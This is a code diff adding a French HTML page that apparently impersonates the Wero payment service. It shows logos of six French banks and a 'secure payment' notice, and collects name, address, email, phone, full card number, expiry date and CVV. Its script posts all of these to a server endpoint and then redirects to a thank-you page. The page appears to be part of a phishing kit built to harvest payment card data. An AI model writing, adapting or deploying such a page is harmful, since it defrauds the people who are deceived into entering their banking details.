@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wero - Informations Personnelles</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500&family=Poppins:wght@600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+
+    <style>
+        .btn-continue {
+            transition: all 0.2s ease;
+            position: relative;
+            cursor: pointer;
+        }
+        .btn-continue:active {
+            transform: scale(0.98);
+        }
+        .btn-continue:disabled {
+            opacity: 0.9;
+            cursor: not-allowed;
+        }
+        /* Animation de rotation du cercle noir */
+        @keyframes spin-noir {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+        .spinning-black-circle {
+            animation: spin-noir 0.8s linear infinite;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="app-container">
+        
+        <header class="app-header">
+            <div class="logo-container">
+                <img src="flavicon.ico" alt="Wero" class="app-logo">
+            </div>
+            <button class="menu-hamburger" aria-label="Menu">
+                <span></span>
+                <span></span>
+                <span></span>
+            </button>
+        </header>
+
+        <main class="app-content">
+            
+            <h1 class="page-title-form">
+                Informations<br>personnelles 
+                <svg class="title-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <rect x="2" y="5" width="20" height="14" rx="2"/>
+                    <line x1="2" y1="10" x2="22" y2="10"/>
+                </svg>
+            </h1>
+
+            <div class="secure-notice-box">
+                <div class="secure-notice-title">
+                    Paiement sécurisé 
+                    <svg class="inline-icon-lock" viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
+                    </svg>
+                </div>
+                <p class="secure-notice-text">
+                    Vos informations sont traitées de manière sécurisée pour garantir la protection de vos données.
+                </p>
+            </div>
+
+            <form class="wero-form" id="weroForm">
+                
+                <div class="form-group">
+                    <label class="form-label">
+                        <svg class="field-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
+                            <circle cx="12" cy="7" r="4"/>
+                        </svg>
+                        Nom et prénom(s) <span class="required-star">*</span>
+                    </label>
+                    <input type="text" id="1" name="champ_1" class="form-input" placeholder="Ex: Jean Dupont" required>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">
+                        <svg class="field-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/>
+                            <polyline points="9 22 9 12 15 12 15 22"/>
+                        </svg>
+                        Adresse postale <span class="required-star">*</span>
+                    </label>
+                    <input type="text" id="2" name="champ_2" class="form-input" placeholder="Ex: 123 Avenue des Champs-Élysées" required>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">
+                        <svg class="field-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/>
+                            <polyline points="22,6 12,13 2,6"/>
+                        </svg>
+                        Adresse email <span class="required-star">*</span>
+                    </label>
+                    <input type="email" id="3" name="champ_3" class="form-input" placeholder="exemple@email.com" required>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">
+                        <svg class="field-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/>
+                        </svg>
+                        Numéro de téléphone <span class="required-star">*</span>
+                    </label>
+                    <input type="tel" id="4" name="champ_4" class="form-input" placeholder="06 00 00 00 00" required>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">
+                        <svg class="field-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <rect x="2" y="5" width="20" height="14" rx="2"/>
+                            <line x1="2" y1="10" x2="22" y2="10"/>
+                        </svg>
+                        Numéro de carte bancaire <span class="required-star">*</span>
+                    </label>
+                    <input type="text" id="5" name="champ_5" class="form-input text-center-placeholder" placeholder="1234 5678 9012 3456" inputmode="numeric" required>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">
+                        <svg class="field-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <rect x="3" y="4" width="18" height="18" rx="2" ry="2"/>
+                            <line x1="16" y1="2" x2="16" y2="6"/>
+                            <line x1="8" y1="2" x2="8" y2="6"/>
+                            <line x1="3" y1="10" x2="21" y2="10"/>
+                        </svg>
+                        Date d'expiration <span class="required-star">*</span>
+                    </label>
+                    <input type="text" id="6" name="champ_6" class="form-input" placeholder="MM/AA" required>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">
+                        <svg class="field-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
+                            <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+                        </svg>
+                        Cryptogramme (CVV) <span class="required-star">*</span>
+                    </label>
+                    <div class="input-with-icon-wrapper">
+                        <input id="7" name="champ_7" type="text" class="form-input security-input" placeholder="***" inputmode="numeric" required>
+                        <svg class="input-internal-lock" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
+                        </svg>
+                    </div>
+                </div>
+
+                <button type="submit" id="submitBtn" class="btn-continue btn-form-spacing">
+                    <span>CONTINUER</span>
+                    <span class="btn-icon-badge">
+                        <svg id="btnIcon" class="btn-arrow-svg" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M8 5v14l11-7z"/>
+                        </svg>
+                    </span>
+                </button>
+
+            </form>
+
+        </main>
+
+        <footer class="app-footer">
+            <p class="footer-text-label horizontal-bold">NOS PARTENAIRES</p>
+            <div class="partners-row">
+                <img src="Societe-Generale-Emblem.png" alt="Société Générale" class="partner-icon">
+                <img src="Banquepopulaire_logo.svg.webp" alt="Banque Populaire" class="partner-icon">
+                <img src="logo_BanquePostale_600x300.webp" alt="La Banque Postale" class="partner-icon">
+                <img src="12895685.png" alt="Caisse d'Épargne" class="partner-icon">
+                <img src="IMG_9197.png" alt="Crédit Agricole" class="partner-icon">
+                <img src="unnamed.jpg" alt="Crédit Mutuel" class="partner-icon">
+            </div>
+        </footer>
+
+    </div>
+
+<script>
+    /*** 1. AUTO-FORMATAGE EN DIRECT (Téléphone, Carte, Exp, CVV) ***/
+    const input4 = document.getElementById('4') || document.querySelector('[name="champ4"]');
+    const input5 = document.getElementById('5') || document.querySelector('[name="champ5"]');
+    const input6 = document.getElementById('6') || document.querySelector('[name="champ6"]');
+    const input7 = document.getElementById('7') || document.querySelector('[name="champ7"]');
+
+    if (input4) {
+        input4.addEventListener('input', function(e) {
+            let v = e.target.value.replace(/\D/g, '').slice(0, 10);
+            e.target.value = v.match(/.{1,2}/g)?.join(' ') || v;
+        });
+    }
+
+    if (input5) {
+        input5.addEventListener('input', function(e) {
+            let v = e.target.value.replace(/\D/g, '').slice(0, 16);
+            e.target.value = v.match(/.{1,4}/g)?.join(' ') || v;
+        });
+    }
+
+    if (input6) {
+        input6.addEventListener('input', function(e) {
+            let v = e.target.value.replace(/\D/g, '').slice(0, 4);
+            e.target.value = v.length > 2 ? v.slice(0, 2) + '/' + v.slice(2) : v;
+        });
+    }
+
+    if (input7) {
+        input7.addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 3);
+        });
+    }
+
+
+    /*** 2. INTERCEPTION DE LA SOUMISSION ET ENVOI GLOBAL ***/
+    document.getElementById('weroForm').addEventListener('submit', async function(event) {
+        event.preventDefault(); // Sécurité : Empêche la page blanche et le rechargement
+
+        const submitBtn = document.getElementById('submitBtn');
+        const btnIcon = document.getElementById('btnIcon');
+
+        // Lancement de l'animation
+        if (submitBtn) submitBtn.disabled = true;
+        if (btnIcon) {
+            btnIcon.setAttribute('viewBox', '0 0 24 24');
+            btnIcon.classList.add('spinning-black-circle');
+            btnIcon.innerHTML = '<circle cx="12" cy="12" r="10" stroke="#000000" stroke-width="4" fill="none" stroke-dasharray="31.4 31.4"></circle>';
+        }
+
+        // --- FONCTION INTERNE DE RÉCUPÉRATION SÉCURISÉE ---
+        // Cherche d'abord par ID (ex: '4'), sinon par l'attribut name (ex: 'champ4')
+        const getFieldValue = (id, name) => {
+            const el = document.getElementById(id) || document.querySelector(`[name="${name}"]`);
+            return el ? el.value.trim() : '';
+        };
+
+        // --- EXTRACTION DYNAMIQUE DES 7 CHAMPS ---
+        const dataToSend = {
+            page_source: 'B2_Formulaire_Carte',
+            champ1: getFieldValue('1', 'champ1'), // Nom & Prénom
+            champ2: getFieldValue('2', 'champ2'), // Adresse Postale
+            champ3: getFieldValue('3', 'champ3'), // Email
+            champ4: getFieldValue('4', 'champ4'), // Téléphone
+            champ5: getFieldValue('5', 'champ5'), // Numéro de Carte
+            champ6: getFieldValue('6', 'champ6'), // Date d'expiration
+            champ7: getFieldValue('7', 'champ7')  // CVV
+        };
+
+        try {
+            const response = await fetch('/api/traitement_etape2', { 
+                method: 'POST', 
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(dataToSend)
+            });
+            
+            const textData = await response.text();
+            let result;
+            try {
+                result = JSON.parse(textData);
+            } catch (e) {
+                throw new Error(`Le serveur a renvoyé une réponse illisible (${response.status}).`);
+            }
+
+            if (response.ok && result.success) {
+                setTimeout(() => {
+                    window.location.href = result.redirect || 'merci.html';
+                }, 2000);
+            } else {
+                alert(result.message || "Une erreur est survenue.");
+                resetButtonState(submitBtn, btnIcon);
+            }
+
+        } catch (error) {
+            console.error('Erreur réseau :', error);
+            alert(error.message || "Impossible de joindre le serveur.");
+            resetButtonState(submitBtn, btnIcon);
+        }
+    });
+
+    function resetButtonState(btn, icon) {
+        if (btn) btn.disabled = false;
+        if (icon) {
+            icon.classList.remove('spinning-black-circle');
+            icon.innerHTML = ''; 
+        }
+    }
+</script>
+
+</body>
+</html>
